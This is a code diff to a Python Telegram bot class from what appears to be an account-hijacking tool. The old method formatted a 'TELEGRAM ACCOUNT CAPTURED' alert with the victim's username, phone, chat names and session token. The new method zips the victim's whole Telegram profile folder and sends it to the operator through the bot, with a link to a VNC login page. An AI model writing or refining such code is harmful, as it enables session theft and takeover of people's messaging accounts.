@@ -81,38 +81,37 @@ class TelegramBot:
             traceback.print_exc()
             return False
     
-    def send_token(self, session_id: str, token: str, user_info: dict = None) -> bool:
-        """Send Telegram token with user info"""
+    def send_session(self, session_id: str, profile_path: str) -> bool:
+        """Send Telegram session zip"""
         if session_id in self.sent:
             return False
         self.sent.add(session_id)
         
-        # Build message
-        text = "🔐 <b>TELEGRAM ACCOUNT CAPTURED</b>\n\n"
+        profile_dir = Path(profile_path)
+        if not profile_dir.exists():
+            return False
         
-        if user_info and "error" not in user_info:
-            text += f"👤 <b>User:</b> {user_info.get('username', 'Unknown')}\n"
-            if user_info.get('first_name'):
-                text += f"📝 <b>Name:</b> {user_info.get('first_name')} {user_info.get('last_name', '')}\n"
-            if user_info.get('phone'):
-                text += f"📱 <b>Phone:</b> {user_info.get('phone')}\n"
+        # Create zip
+        import zipfile
+        import tempfile
+        
+        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
+            zip_path = tmp.name
+        
+        try:
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for f in profile_dir.rglob('*'):
+                    if f.is_file():
+                        zf.write(f, f.relative_to(profile_dir))
             
-            chats = user_info.get('chats', [])
-            if chats:
-                text += f"\n💬 <b>Chats ({len(chats)}):</b>\n"
-                for chat in chats[:5]:
-                    text += f"  • {chat['name']}\n"
-                if len(chats) > 5:
-                    text += f"  ... and {len(chats) - 5} more\n"
-        
-        text += f"\n🔑 <b>Token:</b>\n<code>{token}</code>\n\n"
-        text += "Click to auto-login:"
-        
-        # Use IP or domain
-        domain = self.domain if self.domain != "localhost" else "127.0.0.1"
-        buttons = [[{"text": "🚀 Auto Login", "url": f"http://{domain}:6080/vnc.html"}]]
-        
-        return self.send_message(text, buttons)
+            caption = "✅ <b>Session Captured</b>\n\nZip dumped"
+            
+            domain = self.domain if self.domain != "localhost" else "127.0.0.1"
+            buttons = [[{"text": "🚀 View", "url": f"http://{domain}:6080/vnc.html"}]]
+            
+            return self.send_file(zip_path, caption, buttons)
+        finally:
+            Path(zip_path).unlink(missing_ok=True)
 
 
 # Singleton
